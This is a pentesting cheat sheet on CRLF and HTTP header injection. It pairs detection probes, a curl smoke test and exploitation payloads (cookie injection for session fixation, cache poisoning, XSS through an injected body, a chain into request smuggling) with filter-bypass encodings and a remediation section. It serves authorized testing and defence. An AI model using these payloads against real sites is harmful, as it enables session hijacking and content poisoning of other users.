# CRLF / HTTP Header Injection

> User input that lands in a response header allows attacker to inject `\r\n` and add headers / body. Authorized testing only. Map: WSTG-INPV-15 (HTTP Splitting), CWE-93/113.

## TL;DR
- `%0d%0a` (URL-encoded CR+LF) in a header-valued parameter splits the header — attacker can inject `Set-Cookie`, `Content-Length`, full HTTP body.
- Modern impact: session fixation, cache poisoning, XSS via injected body, response splitting → smuggling chain.
- Defence: never reflect user input in headers without stripping `\r`/`\n` (and `\x00`). Use a framework that does this by default.

## Detection / Discovery
| Where | Probe |
| --- | --- |
| `Location:` header from redirect-param | `?next=http://target%0d%0aSet-Cookie:%20attacker=1` |
| `Set-Cookie:` reflecting user value | `?lang=en%0d%0aX-Injected: 1` |
| Custom `X-*` headers echoed from input | Same pattern |
| Server-set `Content-Type` reflecting user MIME | `?format=text%0d%0aX-Injected:%20yes` |

```bash
# Smoke test — inject second header
curl -i "https://target/redirect?next=https://allowed.tld%0d%0aX-Injected:%20yes"
# Look at response headers for X-Injected
```

## Exploitation

### Cookie injection (session fixation)
```
?next=https://allowed.tld%0d%0aSet-Cookie:%20session=attacker-controlled
```
If the response sets a cookie attacker controls, victim's subsequent requests use attacker's session token → attacker logs in to see the victim's actions.

### Cache poisoning via injected `Content-Length` / body
```
?next=https://allowed.tld%0d%0aContent-Length:%20100%0d%0a%0d%0a<html>poisoned</html>%0d%0a
```
Front-end cache stores the response; subsequent users get poisoned content. Pair with the cache-key-confusion technique in [./cache-deception.md](./cache-deception.md).

### XSS via injected body
Inject `Content-Type: text/html` + `\r\n\r\n` + `<script>…</script>` — browser parses subsequent bytes as the response body.

### CRLF → request smuggling
On HTTP/1.1-to-HTTP/1.1 hops, injected `Transfer-Encoding: chunked` opens a smuggling channel (see [./http-request-smuggling.md](./http-request-smuggling.md)).

## Bypasses
- `%0d%0a` filtered → try `%00%0a` (null+LF, some parsers accept), `%0a%0d`, `%23%0a` (`#\n`), Unicode `
`.
- Double-encoded: `%250d%250a` (server decodes once → re-decodes downstream).
- Header value normalisation removes `\r`, leaves `\n` → bare-LF still parsed as line terminator by some servers (RFC says no, reality says yes).

## Defence / Remediation
- **Strip `\r`, `\n`, `\x00`** from any header value built from user input (CWE-93).
- **Validate redirect targets** against a host allow-list — break the most common CRLF sink at the same time.
- **Use a framework's response API** (`response.set_cookie(...)`, `redirect(url)`) rather than manual `header()` / `setHeader()` calls — frameworks reject newlines.
- **Disable HTTP/1.x bare-LF parsing** at the front-end (nginx ≥ 1.21.1, HAProxy, Envoy support strict CRLF mode).
- **Don't echo `Content-Length` from user input** — let the framework compute it.
- CWE-113 Improper Neutralization of CRLF Sequences in HTTP Headers.

## Sources
- OWASP WSTG-INPV-15 HTTP Splitting/Smuggling: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Splitting_Smuggling
- PortSwigger HTTP response header injection: https://portswigger.net/kb/issues/00200200_http-response-header-injection
- PayloadsAllTheThings CRLF Injection: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection
- HackTricks CRLF: https://book.hacktricks.wiki/en/pentesting-web/crlf-0d-0a.html
- CWE-93 Improper Neutralization of CRLF Sequences: https://cwe.mitre.org/data/definitions/93.html
- CWE-113 Improper Neutralization of CRLF Sequences in HTTP Headers: https://cwe.mitre.org/data/definitions/113.html
